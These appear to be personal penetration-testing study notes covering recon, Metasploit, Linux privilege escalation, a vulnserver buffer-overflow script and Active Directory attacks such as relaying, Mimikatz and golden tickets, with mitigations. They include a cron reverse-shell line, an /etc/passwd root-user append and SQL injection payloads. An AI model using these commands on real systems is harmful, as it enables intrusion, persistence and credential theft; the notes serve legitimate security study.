===============================
======== TOOLS / SITES ========
===============================



Bug Bounties
	bugcrowd.com
	
Email Address Gathering
	Hunter.io - Email format, Names, Job Titles, Departments
	The Harvester
	
Domain
	sublist3r - lists subdomains
		-Use with tomnomnom -> httprobe
	whatweb 

Browser (Websites and extensions)
	crt.sh - Website -> List subdomains
	builtwith.com -> Info gathering
	Wappalyzer -> Browser extension - same functionality as builtwith.com
	foxyproxy -> Browser extension
	Utilize search engines
	Utilize Social Media sites

SMB
	| smbclient | smbclient -L (HOST) - edit /etc/samba/smb.conf file, add "client min protocol = NT1" under [global] in === Global Settings ===
	| smbclient -L \\\\xxx.xxx.xxx.xxx\\
		| smbclient \\\\xxx.xxx.xxx.xxx\\XXX$ found from -L 

Arp-scan
	| arp-scan -l - Generate ip addresses from local network

SSH 
	| ssh xxx.xxx.xxx.xxx 
		If 'old' - no matching key exchange, add -oKeyAlgorithms=+"their offer" | no cipher -c SOMECIPHER
			| ssh xxx.xxx.xxx.xxx -oKeyAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1 -c aes-cbc

searchsploit - Local vulnerability search
	| searchsploit xxxxxxxxx
		searchsploit samba 2.2.1a

MASSCAN
	| https://github.com/robertdavidgraham/masscan
	masscan -p ports | --rate #### | IP addresses
		| masscan -p1-65535 --rate 1000 xxx.xxx.xxx.xxx
		
NESSUS - Vulnerability scanner
	| Download
	| Install - dkpg -i *nessus*
	| Enable with given script "/bin/systemctl start nessusd.service"
	| Open browser with given link : https://kali:8834
	| Nessus Essentials * look at others
	| Enter info for activation code
	| Enter activation code

GCC - for compiling into 32 bit if needed
	| apt-get install gcc-multilib
	| apt-get install g++-multilib
	| apt-get install libssl-dev
	
impacket 
	
	| git clone "https://github.com/SecureAuthCorp/impacket.git"
	

pip
	| curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
	| python get-pip.py
	| python3 get-pip.py
	
pyftpdlib - ftp server
	| pip install pyftpblib

twisted - networking engine foe python
	| pip install twisted


gobuster - web directory search
	| apt-get install gobuster
	

Sherlock - Looks for Windows exploits: 
    MS10-015 : User Mode to Ring (KiTrap0D)
    MS10-092 : Task Scheduler
    MS13-053 : NTUserMessageCall Win32k Kernel Pool Overflow
    MS13-081 : TrackPopupMenuEx Win32k NULL Page
    MS14-058 : TrackPopupMenu Win32k Null Pointer Dereference
    MS15-051 : ClientCopyImage Win32k
    MS15-078 : Font Driver Buffer Overflow
    MS16-016 : 'mrxdav.sys' WebDAV
    MS16-032 : Secondary Logon Handle
    MS16-034 : Windows Kernel-Mode Drivers EoP
    MS16-135 : Win32k Elevation of Privilege
    CVE-2017-7199 : Nessus Agent 6.6.2 - 6.10.3 Priv Esc
	| git clone "https://github.com/rasta-mouse/Sherlock.git"

mitm6
	| git clone "https://github.com/fox-it/mitm6.git"


powersploit
	| Windows Powershell scripts
	| git clone "https://github.com/PowerShellMafia/PowerSploit.git"
	| use on windows host 


Bloodhound
	| apt install bloodhound
	| neo4j console
		| open link in console
			| username + pass "neo4j"
			| used "nova"
			| close browser window
	| new terminal window : "bloodhound"
		| login
			| neo4j | nova
			
	| download/setup injecter
		| git clone "https://github.com/BloodHoundAD/BloodHound.git"
		| put SharpHound.ps1 on windows machine


Crackmapexec
	| apt install crackmapexec
	
	
Mimikatz
	| git clone "https://github.com/gentilkiwi/mimikatz.git"
	
	
	
Docker
	| Prep
		| curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
		| echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list
		| apt update
		| apt-get remove docker docker-engine docker.io
		| apt-get install docker-ce

	| juice-shop
		| https://github.com/bkimminich/juice-shop
		| docker pull bkimminich/juice-shop
			| docker run --rm -p 3000:3000 bkimminich/juice-shop
			
			
					
PayloadAllTheThings
	| git clone "https://github.com/swisskyrepo/PayloadsAllTheThings.git"
	
	
	
Rustscan - Better port scanner	
	| git clone https://github.com/RustScan/RustScan
		| rustscan -a xxx.xxx.xxx.xxx -- -A



Feroxbuster - Directory brute forcer
	| git clone https://github.com/epi052/feroxbuster
		| feroxbuster -u https://somethingsomething


Ciphey - Cryptography solver
	| https://github.com/Ciphey/Ciphey.git
	| python3 -m pip install -U ciphey
	



===============================
======= ATTACKING STEPS =======
===============================

--- SCANNING AND ENUMERATION ---

netdiscover - Machines on network
	-r xxx.xxx.xxx.0/24

MASSCAN
	masscan -p ports | --rate #### | IP addresses
		| masscan -p1-65535 --rate 1000 xxx.xxx.xxx.xxx
		
rustscan - Fastboi port scanner
	| rustscan -b 1000 -t 1500 xxx.xxx.xxx.xxx -- -A -sC -oA nmap/somedir
		| -b = speed   | -t = timeout time | -- -A -sC -sV -oA nmap/some dir = pass commands onto nmap
		
nmap - Port Scanner
	| -sS Stealth Scan | -T# 1-5 Speed | -p- -All ports | -sC Default scripts | -sV Enumerate Versions | -A Everything
	| nmap -sC -sV -oA *location to save info*
	| Take notes

Nessus 
	| Use if able to
		| Enable with given script "/bin/systemctl start nessusd.service"
		| Open browser with given link : https://kali:8834

nikto - Vulnerability scanner
	| nikto -h http://xxx.xxx.xxx.xxx https://xxx.xxx.xxx.xxx 	
	| Take notes

gobuster - Find urls on website
	| dir -mode to use | -e print full urls | dir -u xxx.xxx.xxx.xxx | -w *location to url wordlist* | -x php,txt,zip | -f append / follow directory
	| gobuster dir -e -f -u xxx.xxx.xxx.xxx -w /usr/share/wordlists/dirbuster/xxx.txt -x php,txt,zip
	
searchsploit
	| searchsploit xxxxxxxxx
		searchsploit samba 2.2.1a

msfconsole - Vulnerability search and exploitataion | can also port scan
	| msfconsole	
		| search xxxxx
			| use ## or use xxxxx/xxxxx/xxxxx/xxxxx/xxxxx
				| info
				| options
					| set Required options
					| run
					
SMB
	| smbclient | smbclient -L (HOST) - edit /etc/samba/smb.conf file, add "client min protocol = NT1" under [global] in === Global Settings ===
	| smbclient -L \\\\xxx.xxx.xxx.xxx\\
		| smbclient \\\\xxx.xxx.xxx.xxx\\XXX$ found from -L 

SSH 
	| ssh xxx.xxx.xxx.xxx 
		If 'old' - no matching key exchange, add -oKeyAlgorithms=+"their offer" | no cipher -c SOMECIPHER
			| ssh xxx.xxx.xxx.xxx -oKeyAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1 -c aes-cbc







================================
========= EXPLOITATION =========
================================

Reverse vs. Bind shell
	| Reverse - Victim connects to Attacker offering shell (bin/bash)
	| Bind - Attacker connects to Victim who is offering a shell (bin/bash)

Staged vs. Non-staged payloads
	| Staged - Sends payload in seperate stages - Windows/meterpreter/reverse_tcp
	| Non-staged - Sends payload all at once - Windows/meterpreter_reverse_tcp

Metasploit
	| msfconsole	
		| search xxxxx
			| use ## or use xxxxx/xxxxx/xxxxx/xxxxx/xxxxx
				| info
				| options
					| set Required options
					| run
						| If it fails, change from staged to non-staged Ctrl+c, show options, 
							| set payload xxx/xxx/xxx/xxx/ or set payload xxx/xxx/xxx_xxx_xxx_xxx
							| re-check options
							| run
						| Also change from default 4444 port
	Metasploit Brute force ----------------
	| Auxilary modules have brute force options available  





Manual exploitation
	| Find exploit on internet (github)
	| Follow instructions
	| Use your brain (hard) 

Hydra - Brute force logins
	| hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://xxx.xxx.xxx.xxx -t 4 -V
	| -l Login as | -P password list | define what/where to attack | -t 4  #of threads | -V verbose
	


===============================
====== POST-EXPLOITATION ======
===============================


whoami
getuid
sysinfo
hashdump
Explore
ifconfig
ip a
arp | arp -a
route
sudo -l - Sudo access
/etc/passwd - User enumeration
/etc/shadow - Password hashes
/etc/crontab - Scheduled activites
ps
migrate #### (PID number) - 







File Transfers
	Certutil
		certutil.exe -urlcache http://xxx.xxx.xxx.xxx/file.txt testfile.txt
	HTTP 
		python -m SimpleHTTPServer 80
	Browser	
		Navigate directly to file
	FTP
		python -m pyftpdlib 21 (attacker machine)
		ftp xxx.xxx.xxx.xxx
	Linux
		wget
	Metasploit
		upload/download from meterpreter shell
	

Maintaining Access (dangerous)
	Persistence Scripts
		run persistence -h
		exploit/windows/local/persistence
		exploit/windows/local/registry_persistence
	Scheduled Tasks
		run scheduleme
		run scheduleabuse
	Add a user
		net user hacker password123 /add
		

Pivoting
	Computer A (1 nic) <===> Computer B (2 nics) <===> Computer C (1 nic)
	
	msfconsole
		use exploit/windows/smb/psexec
		options
		set rhosts xxx.xxx.xxx.xxx 
		set smbdomain diablo.local
		set smbpass Password01
		set smbuser deckardcain
		set payload windows/x64/meterpreter/reverse_tcp
		set lhost to xxx.xxx.xxx.xxx 
		set lport to xxxx
		set target 2
		run
			meterpreter session >
				shell
				route print / ipconfig
				arp -a see all connections
				
			run autoroute -s xxx.xxx.xxx.0/24
			run autoroute -p (list all active routes)
			background
			
		search portscan
		use X
			set rhosts xxx.xxx.xxx.xxx 
			
	
	
	
	proxychains
	
	
	
	
Cleanup
	Make the system/network as it was when you entered it
		Remove executables, scripts, and added files
		Remove malware, rootkits, and added user accounts
		Set settigns back to original configurations
		
		Red Teams go even further into log files etc.
		
		
		
		
		
		
		






==============================
============ MISC ============
==============================

EXPLOIT WRITABLE /etc/passwd 	
	| 1st create a compliant hash 
		| openssl passwd -1 -salt [salt] [password]
			| openssl passwd -1 -salt new 123 = $1$new$p7ptkEKU1HnaHpRtzNizS1
			| new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
			| append to passwd " echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd "
			| su new user
			
ESCAPING vi EDITOR
	| If  a user can run vi editor with root privelages and/or NOPASSWD
		| sudo vi
			| :!sh
			| You are now in a root shell
			
EXPLOIT CRONTAB
	| Format
		| # = ID | m = Minute | h = Hour | dom = Day of the Month | mon = Month | dow = Day of the Week | user = What user the command will run as | command = What command should be run
		| 17 * 1 * * * root cd / && run-parts --report /etc/cron.hourly
			| runs 'cd / && run-parts --report /etc/cron.hourly' command as 'root' user every hour
		| echo "bash -i >& /dev/tcp/<attacker ip>/8888 0>&1" > 'cronScript' (on target)
			| nc -lvnp -8888 (on attacker)
			
EXPLOIT PATH VARIABLES
	| echo “/bin/bash” > *command*
		| echo “/bin/bash” > ls
	| make it executable
		| chmod +x ls
	| change PATH variable
		| export PATH="/directory":$PATH
			
LOOTING FOR PASSWORDS
	| grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
	| find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
	| strings /dev/mem -n10 | grep -i PASS | PASSWORDS IN MEMORY
	




==========================================
============ BUFFER OVERFLOWS ============
==========================================

Anatomy of the Stack

	ESP (Extended Stack Pointer)
		**** Buffer Space ****
	EBP (Extended Base Pointer)
	EIP (Extended Instruction Pointer)/Return Address
	
		Steps to condut a Buffer Overflow
			1 - Spiking
			2 - Fuzzing
			3 - Finding the Offset
			4 - Overwriting the EIP
			5 - Finding Bad Characters
			6 - Finding the Right Module
			7 - Generating Shellcode
			8 - Root
	
	
	
				=======
				Spiking
				=======
				Testing for vulnerability
				Randomly sending X amount of characters and x types of characters
					"stats.spk"
					s_readline();
					s_string("STATS ");
					s_string_variable("0");
	
					generic_send_tcp xxx.xxx.xxx.xxx xxxx stats.spk 0 0
	
					"trun.spk"
					s_readline();
					s_string("TRUN ");
					s_string_variable("0");
	
					generic_send_tcp xxx.xxx.xxx.xxx xxxx trun.spk 0 0 ===> crashes vulnserver
	
	
				=======
				Fuzzing
				=======
				Once we find out what is vulnerable we fuzz
				Use fuzzing to find offset ~ 2700 bytes
				
				
				==================
				Finding the offset
				==================
				/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
				Creates a pattern  of non-repeating characters to find exact location of EBP/EIP
				
				EIP = 386F4337
				
				/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337  -
				Finds exact spot in patter and location of pattern of EIP
				[*] Exact match at offset 2003

				======================
				Overwriting the offset
				======================
				#!/usr/bin/python
				import sys, socket

				shellcode = "A" * 2003 + "B" * 4 ===== From our findings in Finding the offset
	
				try:
					s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
					s.connect(('192.168.13.9',9999))
					s.send(('TRUN /.:/' + shellcode))
					s.close()

				except:
					print "Error connecting to server."
					sys.exit()



				EIP Turns into "BBBB" now = we controle the EIP
				
				======================
				Finding bad characters
				======================
				Need to find which characters are good and bad for the shellcode
				
				badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
				"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
				"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
				"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
				"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
				"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
				"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
				"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")





==============================
=======ACTIVE DIRECTORY=======
==============================


	Domain Controllers #1
		Hosts copy of the AD DS directory store
			Consists of the ntds.dit file
			Is stored by default in the %SystemRoot%\NTDS folder on all Domain Controllers
			Has hashes
			
		Logical Active Directory Components
			AD DS Schema
				"Rulebook"
			Domains
				Group and manage objects in an organization
				Administrative boundary for applying policies and groups of objects
			Trees
				Groups of domains (Pyramid scheme style)
				Two-way trust
			Forrest
				Collection of Trees
				
			Organizational Units
				Containers for users/groups/computers
			
			Trusts
				Directional - From one domain to another
				Transitive - Trusts everything that another domain trusts
			Objects
				User
				InetOrgPerson
				Contacts
				Groups
				Computers
				Printers
				Shared folders
				
				
	LLMNR
		Basically DNS when DNS fails
		Previously NBT-NS
		Utilizes a users Username and NTLMv2 hash when appropriatly responded to
		
		STEPS 
			1 Run Responder - python Responder.py -I eth0 -rdw  ||||| First thing to do before nmap or nessus etc since it needs a lot of traffic 
			2 ...an event occurs...
			3 Get hashes ez
			4 Crack hashes -  hashcat -m 5600 hashes.txt rockyou.txt
			

		MITIGATION
			- To disable LLMNR, select "Turn OFF Multicast Name Resolution" under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in the Group Policy Editor.
			- To disable NBT-NS, navigate to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINS tab ans select "Disable NEtBIOS over TCP/IP".
			
			If a company must use or cannot disable LLMNR/NBT-NS, the best course of action is to:
			- Require Network Access Control
			- Require strong user passwords (e.g., > 14 characters in length and limit common word usage). The more complex and long the password, the harder it is for an attacker to crack the hash.
			

	SMB Relay
		Instead of creacking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access
		Requirements
			- SMB signing must be disabled on the target
			- Relayed user credentials must be admin on machine
			

		STEPS
			1 Edit Responder config file
			2 Disable SMB and HTTP
			3 Run Responder 
				python Responder.py -I eth0 -rdwv
			4 Set up relay
				python ntlmrelay.py -tf targets.txt -smb2support | add -i for interactive (shell) | -e for execute (test.exe meterpreter shell) | -c "whoami" (command execution)
			5 An even occurs...
			6 Get creds/hashes
				Able to dump SAM hashes of local users
			7 Can get shell with Metasploit/psexec.py/wmiexec.py/smbexec.py
			
			
		MITIGATION	
			- Enable SMB Signing on all devices
				- Pro : Completely stops the attack
				- Con : Can cause performance issues with file copies
			- Disable NTLM authentication on the network
				- Pro : Completely stops the attack
				- Con : If Kerberose stops working, Windows defaults back to NTLM
			- Account tiering 
				- Pro : Limits domain accounts to specific tasks
						(e.g. only log onto servers with need for DA)
				- Con : Enforcing the policy may be difficult
			- Local admin restriction
				- Pro : Can prevent a lot of lateral movement
				- Con : Potential increas in the amount of service desk tickets
				

	IPv6 Attacks
		Spoof DNS for IPv6 -> Gain access to DC
		LDAP Relay
		NTLM Relayx
		MITM6
		

		STEPS
		1 mitm6 -d diablo.local
		2 ntlmrelayx.py -6 -t ldaps://192.168.13.10 -wh fakewpad.diablo.local -l lootme
						^ IPv6    ^ ldap secure                                ^ loot
		3 loot
		
		
		MITIGATION
		1 IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environments. If you don't use IPv6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy.
		  Disabling IPv6 entirely may have unwanted side effects. Setting the following predetermined rules to Block isntead of Allow prevent the attack from working:
			a (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPv6-In)
			b (Inbound) Core Netowrking - Router Advertisement (ICMPv6-In)
			c (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPv6-Out)
		2 If WPAD is not in use internally, disable it via Group Policy and by disabling the WinHttpAutoProxySvc service.
		3 Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding. 
		4 Consider Administrative users to the Protected Users group or making them as Account is sensitive and cannot be delegate, which will prevent any impersonation of that user via delegation.
		

	Attack strategies
		1 Begin day with mitm6 or responder
		2 Run scans to generate traffic
		3 If scans are taking too long, look for websites in scope (http_version - metasploit module)
		4 Look for default credentials on web logins
			Printers
			Jenkins
			Etc
		5 Think outside the box (phone story - Outlook password reset goes to phone system, he controlled phone system so it can effectivly bybass 2FA)


	Post-Compromise Enumeration
		PowerSploit - "https://github.com/PowerShellMafia/PowerSploit.git"
			1 cmd : powershell -ep bypass
			2 ". .\PowerView.ps1"
			3 Get-NetDomain - get informaion about domain
			4 Get-NetDomainController - More information about DC specifically
			5 Get-DomainPolicy 
			6 (Get-DomainPolicy)."system access"
			7 Get-NetUser - User information
			8 Get-NetUser | select cn - Pulls usernames
			9 Get-NetUser | select samaccountname
			10 Get-NetUser | select description
			11 Get-UserProperty 
			12 Get-UserProperty -Properties pwdlastset - When password was last changed
			13 Get-UserProperty -Properties logoncount - Can fish out Honeypot accounts with super low logon counts
			14 Get-UserProperty -Properties badpwdcount - Failed logon attempts
			15 Get-NetComputer - Lists all computers in domain
			16 Get-NetComputer -FullData - Lists everything
			17 Get-NetComputer -FullData | select OperatingSystem - narrow down results
			18 Get-NetGroup - Group information on server
			19 Get-NetGroup -GroupName *admin*
			20 Get-NetGroupMember -GroupName "Domain Admins"
			21 Invoke-ShareFinder - View all shares
			22 Get-NetGPO - Show Group Policies
			23 Get-NetGPO | select displayname, whenchanged
		
		
		Bloodhound
			1 start/setup neo4j
			2 start bloodhound
			3 get injectors "https://github.com/BloodHoundAD/BloodHound.git"
			4 put SharpHound.ps1 on windows host
			5 cmd prompt : powershell -ep bypass
			6 ". .\SharpHound.ps1"
			7 Invoke-BloodHound -CollectionMethod All -Domain DIABLO.local -ZipFileName file.zip
			8 Move zip file onto Kali machine
			9 On Bloodhound console
				Upload data : select zip file
				Hamburger menu
					Queries - Built-in "filters"
					


	Post-Compromise Attacks (requires to be already compromised)
		Pass the Password / Pass the Hash
			If we crack a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networkds
				| Crackmapexec
					| crackmapexec <ip/CIDR> -u <user> -d <domain> -p <pass> | crackmapexec 192.168.13.0/24 -u deckardcain -d DIABLO.local -p Password01
						| secretsdump.py diablo/deckardcain:Password01@132.168.13.11
					| crackmapexec <ip/CIDR> -u <user> -H <hash> --local     | crackmapexec 192.168.13.0/24 -u "Deckard Cain" -H <hash> --local
						| NTLM hashes can be passed around NTLMv2 hashes can NOT be passed around | second "half" of has is what you pass around
						
		
		MITIGATIONS
			Hard to completely prevent, but we can make it more difficult on the attacker:
				Limit account re-use:
					Avoid re-using local admin password
					Disable Guest and Administrator accounts
					Limit who is a local administrator (least privilege)
				Utilize strong passwords:
					The longer the better (>14 characters)
					Avoid using common passwords
				Privilege Access Management (PAM)
					Check out/in sensitive accounts when needed
					Automatically rotate passwords on check out and check in
					Limits pass attacks as hash/password is strong and constantly rotated
				


	Token Impersonation
		What are tokens?
			Temporary keys tha tallow you access to a system/network without having to provide credentials each time you access a file. (Cookies for computers)
		Two types:
			Delegate - Created for loggign into a machine or using Remote Desktop - last until the computer is rebooted
			Impersonate - "non-interactive" such as attaching a network drive or a domain logon script
		
			1 Get a shell
				use exploit/windows/smb/psexec
				options
				set everything
				set payload windows/xXX/meterpreter/reverse_tcp
				set target native upload
			2 load <tab> (lists tools)
				load incogneto
					help
				list_tokens -u (user)
				impersonate_token diablo\\administrator
				
				(rev2self) - revert back to original shell
		
		MITIGATION	
			Limit user/group token creation permissions
			Account tiering
			Local admin restriction
			

	Kerberoasting
	
		Steps
			1 : Get SPNs, Dump Hash
				python GetUserSPNs.py <DOMAIN/username:password> -dc-ip <ip of DC> -request
			2 : Crack with hashcat
				hashcat -m 13100 hashes.txt rockyou.txt -O
			
		MITIGATION
			1 : Use strong passwords
			2 : Least privilege 
			
	Group Policy Preferences (GPP) (MS14-025)
		Overview
			- Group Policy Preferences allowed admis to create policies using embedded credentials
			- These credentials are encrypted and placed in a "cPassword" (Groups.xml)
			- The key was accidentally released 
			- Patched in MS14-025, but doesn't prevent previous uses
			

	Mimikatz
		Overview
			- Tool used to view and steal credentials, generate Kerberose tickets, and leverage attacks
			- Dumps credentials stored in memory
			- Just a few attacks: Credential Dumping, Pass-the-hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket
			
		On Windows Machine:
			1 mimikatz.exe
			2 sekurlsa::logonpasswords
			3 lsadump::sam || lsadump::sam /patch
			4 lsadump::lsa /patch || dumps LocalSecurityAuthority (users:NTLM)
			5 ntds.dit 
	
	
	Golden Ticket
		On Windows Machine:
			1 mimikatz.exe
			2 privilege::debug
			3 lsadump::lsa /inject /name:krbtgt
			4 kerberos::golden /User:Administrator /domain:diablo.local /sid: <of domain> /krbtgt:<krbtgt hash> /id:500 (admin user #) /ptt (passtheticket)
			5 misc::cmd 
				Opens cmd prompt
				dir \\ROUGEENCAMPMENT\c$
		
	
	Additional Resources
		https://adsecurity.org/
		blog.harmj0y.net/
		www.pentesteracademy.com/activedirectorylab $$$
		www.pentesteracademy.com/redteamlab $$$$$
		www.elearnsecurity.com/course/penetration_testing_extreme $$$$$$$$$




=============================
=======WEB APPLICATION=======
=============================
	
Go lang
	Google go lang download
	linux package (amd64)
	tar -xvf *downloaded file* -C /usr/local
	chown -R root:root /usr/local/go
	gedit ~/.profile OR PROBABLY .bashrc 
		Add to the end of the file:
		export GOPATH=$HOME/go
		export PATH=$PATH:$GOPATH/bin
		export PATH=$PATH:/usr/local/go/bin

	". ~/.profile"
	

AssetFinder - Find domains and subdomains related to a given domain
	git clone "https://github.com/tomnomnom/assetfinder.git" 
	
	go get -u github.com/tomnomnom/assetfinder


Amass - Network mapping of attack surfaces and external asset discovery
	git clone "https://github.com/OWASP/Amass.git"
	
	go:
		export GO111MODULE=on
		go get -v github.com/OWASP/Amass/v3/...


	amass enum -d vivint.com

HTTProbe
	git clone "https://github.com/tomnomnom/httprobe.git"
	
	go get -u github.com/tomnomnom/httprobe

	cat vivint.com/recon/final.txt | httprobe
	
	
#!Gowitness
	git clone "https://github.com/sensepost/gowitness.git"
	
	go get -u github.com/sensepost/gowitness || go get -u=patch github.com/sensepost/gowitness@latest
	
		Install Google Chrome
			wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
			apt install gdebi-core
			gdebi google-chrome-stable_current_amd64.deb
	
	
	gowitness single https://vivint.com
	
	
	
EyeWitness 
	git clone "https://github.com/FortyNorthSecurity/EyeWitness.git"
	
	cd /EyeWitness/Python/setup
	
	./setup.sh
		
		./EyeWitness.py -f filename --timeout optionaltimeout
	
		./EyeWitness -f urls.txt --web

		./EyeWitness -x urls.xml --timeout 8 

		./EyeWitness.py -f urls.txt --web --proxy-ip 127.0.0.1 --proxy-port 8080 --proxy-type socks5 --timeout 120




Testing the Top 10 Web Application Vulnerabilities

	Top 10 Web Application Security Risks

    Injection. 
		Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.
    Broken Authentication. 
		Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently.
    Sensitive Data Exposure. 
		Many web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data may be compromised without extra protection, such as encryption at rest or in transit, and requires special precautions when exchanged with the browser.
    XML External Entities (XXE). 
		Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks.
    Broken Access Control. 
		Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access other users’ accounts, view sensitive files, modify other users’ data, change access rights, etc.
    Security Misconfiguration. 
		Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information. Not only must all operating systems, frameworks, libraries, and applications be securely configured, but they must be patched/upgraded in a timely fashion.
    Cross-Site Scripting XSS. 
		XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.
    Insecure Deserialization. 
		Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.
    Using Components with Known Vulnerabilities. 
		Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.
    Insufficient Logging & Monitoring. 
		Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response, allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring.



	**********
	JUICE SHOP
	**********
	1 - Injection
		SQL injection is an attack in which malicious SQL statements are injected into an SQL database
		Easy to avoid but still common
		If successful, we canread sensitive databases, extract information, modify databases, and potentially even get a shell
			Common SQL Verbs
				SQL statements being with verbs. Here are a few common verbs:
					1 SELECT - Retrieves data from a table						|	SELECT * FROM Users; | SELECT UserID, UserName FROM Users; | SELECT * FROM Users WHERE Country='RU'; | SELECT * FROM Users WHERE Country='US' AND UserName='Deckard';
					2 INSERT - Adds data to a table								|
					3 DELETE - Removes data from a table						|
					4 UPDATE - Modifies data in a table							|
					5 DROP - Delete a table (Devil emoji)						|
					6 UNION - Combines data from multiple queries				|
					7 WHERE - Filters records based on specific condition		|
					9 AND/OR/NOT - Filter records based on multiple conditions	|
					10 ORDER BY - Sorts recoreds in ascending/descending order	|
			Special Characters		
				| String Delimiters 					| ' and "
				| Comment Delimiters 					| -- and /* and #
				| Wildcards 							| * and %
				| Ends SQL statement 					| ;
				| Others that follow programatic logic 	| = and + and > and < and ( ) etc.

		EXAMPLE
		| Input: test
		| SQL: SELECT * FROM Users WHERE email='test'; Normal
		
		| Input: test'
		| SQL: SELECT * FROM Users WHERE email='test''; Throws error
		|											^ 	Delimited (ends the input statment)
		| 											 ^	This quote doesn't have an ending - Causes the error
		
		| Input: test' OR 1=1; --
		| SQL: SELECT * FROM Users WHERE email='test' OR 1=1; --'; 
		|											^ 				Delimited (ends the input statment)
		| 											   ^ 			Adding another condition
		|												  ^			Provides a TRUE Statement
		| 													^		Ends SQL Statement
		|													  ^		Starts a comment (everything after this doesn't get run or checked)

		| DEFENCES / MITIGATIONS
			| Parameterized Statements
				| Ensure inputs (parameters) are used safely in SQL statements
					| EXAMPLE: "SELECT * FROM users WHERE email =?";                     GOOD
					| EXAMPLE: "SELECT * FROM users WHERE email ='" + email + "'";       NOT SO GOOD
			| Sanitizing Input
	
	2 - Broken Authentication
		| https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication
		| Authentication issues
		| Bypass authentication?
		| Information disclosure (bad username OR password? over bad username)
		
	3 - Sensitive Data Exposure
		| https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
		| nmap --script=ssl-enum-ciphers -p 443 website.com

	4 - XML External Entities (XXE)
